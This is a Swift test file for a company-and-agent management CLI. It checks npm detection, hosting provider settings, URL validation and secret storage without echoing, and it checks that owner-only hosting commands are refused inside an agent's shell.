        let npm: Doctor.Exec = { exe, args in exe == "npm" && args == ["--version"] ? "11.12.1\n" : nil }
        #expect(await Doctor.npmItem(store: store, exec: npm) == nil)
        try store.setHosting(companyId: c.id, by: .owner)
        let item = try #require(await Doctor.npmItem(store: store, exec: npm))
        #expect(item.name == "npm"); #expect(item.status == .pass); #expect(item.detail.hasPrefix("11.12.1"))
        #expect(item.detail.contains("unverified"))
        let missing = try #require(await Doctor.npmItem(store: store, exec: { _, _ in nil }))
        #expect(missing == DoctorItem(name: "npm", status: .warn, detail: "install Node.js to deploy"))
    }

    @Test func hostingCLIOwnerOnly() throws {
        let owner = try OwnerTestHome(); defer { withExtendedLifetime(owner) {} }
        let home = owner.url
        let created = try brahma(["company", "create", "Acme", "--goal", "g", "--agents", "0"], home: home)
        #expect(created.status == 0, "\(created.stderr)")
        let fresh = try brahma(["hosting", "Acme"], home: home)
        #expect(fresh.status == 0, "\(fresh.stderr)")
        #expect(fresh.stdout.contains("not configured yet"))
        #expect(fresh.stdout.contains("provider: Cloudflare Pages (cloudflare-pages)"))
        #expect(fresh.stdout.contains("project: acme"))
        #expect(fresh.stdout.contains("token: missing (CLOUDFLARE_API_TOKEN)"))
        // Owner-write: refused in an agent's shell.
        let inAgent = try brahma(["hosting", "set", "Acme", "--project", "evil"], home: home, env: ["BRAHMA_AGENT_ID": "a1"])
        #expect(inAgent.status == 1); #expect(inAgent.stderr.contains("owner commands can't run inside an agent turn"))
        let bad = try brahma(["hosting", "set", "Acme", "--provider", "netlify"], home: home)
        #expect(bad.status != 0); #expect(bad.stderr.contains("provider must be one of: cloudflare-pages, vercel"))
        let badURL = try brahma(["hosting", "set", "Acme", "--production-url", "http://acme.com"], home: home)
        #expect(badURL.status != 0); #expect(badURL.stderr.contains("production URL must start with https://"))
        let set = try brahma(["hosting", "set", "Acme", "--project", "acme-site", "--account-id", "0123abcd",
                              "--production-url", "https://acme.com"], home: home)
        #expect(set.status == 0, "\(set.stderr)")
        #expect(set.stdout.contains("Cloudflare Pages project acme-site"))
        let stored = try brahma(["secret", "set", "Acme", "CLOUDFLARE_API_TOKEN"], home: home, stdin: "cf-token-value-123456")
        #expect(stored.status == 0, "\(stored.stderr)")
        let shown = try brahma(["hosting", "Acme"], home: home)
        #expect(!shown.stdout.contains("not configured yet"))
        for line in ["project: acme-site", "account: 0123abcd", "production URL: https://acme.com", "domain: none", "build: none",
                     "output: none", "smoke: none", "token: present (CLOUDFLARE_API_TOKEN)"] {
            #expect(shown.stdout.contains(line), "\(line): \(shown.stdout)")
        }
        #expect(!shown.stdout.contains("cf-token-value-123456"))
        let vercel = try brahma(["hosting", "set", "Acme", "--provider", "vercel"], home: home)
        #expect(vercel.status == 0, "\(vercel.stderr)"); #expect(vercel.stdout.contains("Hobby"))
        let v = try brahma(["hosting", "show", "Acme"], home: home)
        #expect(v.stdout.contains("provider: Vercel (vercel)")); #expect(v.stdout.contains("token: missing (VERCEL_TOKEN)"))
        #expect(v.stdout.contains("unverified")); #expect(v.stdout.contains("account: none"))
    }
}
